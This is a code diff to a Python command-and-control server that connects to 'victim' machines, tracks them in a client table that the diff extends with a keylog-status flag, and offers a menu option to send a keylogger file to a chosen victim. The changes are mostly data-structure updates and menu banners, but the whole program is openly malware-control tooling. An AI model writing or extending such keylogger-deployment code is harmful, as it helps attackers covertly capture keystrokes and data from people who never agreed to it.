@@ -134,7 +134,7 @@ def initial_connect_to_client(sockets_list: list, connected_clients: dict,
         print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((dest_ip, dest_port)))
 
         # Add the new client socket to the connected_clients dictionary (Key/Value pair)
-        connected_clients[target_socket] = (dest_ip, dest_port)
+        connected_clients[target_socket] = (dest_ip, dest_port, False)
         sockets_list.append(target_socket)
         return target_socket
 
@@ -160,20 +160,29 @@ def connect_to_client_with_prompt(sockets_list: list, connected_clients: dict):
         print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((target_ip, target_port)))
 
         # Add the new client socket to the connected_clients dictionary (Key/Value pair)
-        connected_clients[target_socket] = (target_ip, target_port)
+        connected_clients[target_socket] = (target_ip, target_port, False)
         sockets_list.append(target_socket)
+
+        # Print closing statements
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+
         return True, target_socket, target_ip, target_port
 
     except Exception as e:
         print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
         return False, None, None, None
 
 
-def process_new_connections(server_socket: socket.socket, sockets_to_read: list, client_dict: dict):
+def process_new_connections(server_socket: socket.socket, sockets_to_read: list,
+                            client_dict: dict):
     client_socket, client_address = server_socket.accept()
     print(constants.NEW_CONNECTION_MSG.format(client_address))
     sockets_to_read.append(client_socket)
-    client_dict[client_socket] = client_address
+    client_dict[client_socket] = (client_address, False)
+    print(constants.MENU_CLOSING_BANNER)
 
 
 def disconnect_from_client(sockets_list: list, connected_clients: dict):
@@ -185,12 +194,13 @@ def disconnect_from_client(sockets_list: list, connected_clients: dict):
         try:
             target_ip = str(ipaddress.ip_address(input(constants.ENTER_TARGET_IP_DISCONNECT_PROMPT)))
             target_port = int(input(constants.ENTER_TARGET_PORT_DISCONNECT_PROMPT))
+            keylog_status = False
 
             # CHECK: if client is present in connected_clients list
-            if (target_ip, target_port) in connected_clients.values():
+            if (target_ip, target_port, keylog_status) in connected_clients.values():
                 print(constants.DISCONNECT_FROM_VICTIM_MSG.format((target_ip, target_port)))
 
-                for client_sock, (ip, port) in connected_clients.items():
+                for client_sock, (ip, port, _) in connected_clients.items():
                     if ip == target_ip and port == target_port:
                         target_socket = client_sock
 
@@ -207,6 +217,9 @@ def disconnect_from_client(sockets_list: list, connected_clients: dict):
                 print(constants.DISCONNECT_FROM_VICTIM_ERROR)
         except ValueError as e:
             print(constants.INVALID_INPUT_ERROR.format(e))
+
+    print(constants.RETURN_MAIN_MENU_MSG)
+    print(constants.MENU_CLOSING_BANNER)
 
 
 def transfer_file(sock: socket.socket,
@@ -254,7 +267,7 @@ def find_specific_client_socket(client_dict: dict,
         ipaddress.ip_address(target_ip)
 
         # Find a specific client socket from client socket list to send data to
-        for client_sock, (ip, port) in client_dict.items():
+        for client_sock, (ip, port, _) in client_dict.items():
             if ip == target_ip and port == target_port:
                 target_socket = client_sock
                 break
@@ -277,7 +290,7 @@ def perform_menu_item_3(client_dict: dict):
 
     # Handle single client in client list
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
-        client_socket, (client_ip, client_port) = next(iter(client_dict.items()))
+        client_socket, (client_ip, client_port, _) = next(iter(client_dict.items()))
         transfer_file(client_socket, client_ip, client_port)
 
     # Send keylogger to any specific connected victim
@@ -291,3 +304,5 @@ def perform_menu_item_3(client_dict: dict):
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
 
+    print(constants.RETURN_MAIN_MENU_MSG)
+    print(constants.MENU_CLOSING_BANNER)
